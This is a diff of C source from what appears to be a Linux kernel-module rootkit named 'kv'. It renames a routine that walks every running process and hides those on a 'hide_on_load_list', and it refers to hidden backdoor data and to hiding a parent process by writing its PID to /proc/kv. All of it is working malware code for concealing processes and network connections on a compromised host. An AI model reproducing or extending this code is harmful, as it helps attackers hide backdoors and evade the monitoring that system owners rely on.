@@ -16,7 +16,6 @@
 #include <linux/inet.h>
 #include "lkm.h"
 #include "fs.h"
-#include "netapp.h"
 
 static LIST_HEAD(tasks_node);
 #ifdef DEBUG_RING_BUFFER
@@ -455,7 +454,7 @@ bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *priv) {
  * that this function also conceals the connections of network applications.
  * For more information, refer to 'netapp.h'.
  */
-void kv_scan_and_hide_netapp(void) {
+void kv_scan_and_hide(void) {
     struct task_struct *t;
 
     for_each_process(t) {
@@ -467,13 +466,13 @@ void kv_scan_and_hide_netapp(void) {
         if (!(fnode = fs_get_file_node(t))) continue;
 
         /* XXX: optimise this */
-        for (; netapp_list[i] != NULL; ++i) {
-            if (strncmp(netapp_list[i], t->comm, strlen(netapp_list[i]))) continue;
-            prinfo("Hide netapp task: %d %s i=%d '%s'\n", t->pid, fnode->filename, i, netapp_list[i]);
+        for (; hide_on_load_list[i] != NULL; ++i) {
+            if (strncmp(hide_on_load_list[i], t->comm, strlen(hide_on_load_list[i]))) continue;
+            prinfo("Hide netapp task: %d %s i=%d '%s'\n", t->pid, fnode->filename, i, hide_on_load_list[i]);
             /**
              * notice that any netapp added here
              * will NOT be killed if kv is unloaded
-             * In reality an application that is listed in netapp_list will be handled
+             * In reality an application that is listed in hide_on_load_list will be handled
              * in the same way as if you manually hide a parent process:
              *  echo <pid of parent> >/proc/kv
              */
